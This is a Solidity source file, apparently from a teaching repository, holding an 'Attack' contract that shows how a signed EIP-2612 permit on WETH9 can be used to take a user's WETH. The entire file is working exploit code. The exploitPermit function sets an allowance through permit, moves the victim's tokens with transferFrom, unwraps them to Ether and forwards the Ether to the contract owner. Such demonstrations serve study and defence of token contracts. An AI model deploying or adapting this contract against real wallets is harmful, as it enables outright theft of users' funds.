// SPDX-License-Identifier: MIT
// Author: Yaghoub Adelzadeh
// GitHub: https://www.github.com/dappteacher
pragma solidity ^0.8.26;

import "./WETH9.sol";

/// @title Attack - A contract to demonstrate the exploitation of WETH permit functionality
/// @dev This contract exploits the EIP-2612 permit function to steal WETH from a user.
contract Attack {
    WETH9 public weth;
    address public owner;

    /// @notice Constructor that initializes the Attack contract with the WETH contract address
    /// @param _weth The address of the deployed WETH9 contract
    constructor(address payable _weth) {
        weth = WETH9(_weth);
        owner = msg.sender;
    }

    /// @notice Exploits the permit function to steal WETH from a user
    /// @param user The address of the user whose WETH is to be stolen
    /// @param value The amount of WETH to steal
    /// @param deadline The deadline timestamp for the permit
    /// @param v The recovery byte of the signature
    /// @param r Half of the ECDSA signature pair
    /// @param s Half of the ECDSA signature pair
    /// @dev Uses the permit function to set an allowance, transfers the WETH to the attacker, and then withdraws the WETH to Ether.
    function exploitPermit(
        address user,
        uint value,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        // Step 1: Use permit to set allowance
        weth.permit(user, address(this), value, deadline, v, r, s);

        // Step 2: Call the transferFrom function to transfer tokens to attacker
        weth.transferFrom(user, address(this), value);

        // Step 3: Immediately withdraw the stolen WETH to Ether
        weth.withdraw(value);

        // Now the attacker has the Ether
        payable(owner).transfer(address(this).balance);
    }

    /// @notice Fallback function to receive Ether
    /// @dev This function is called when Ether is sent to the contract.
    receive() external payable {}
}
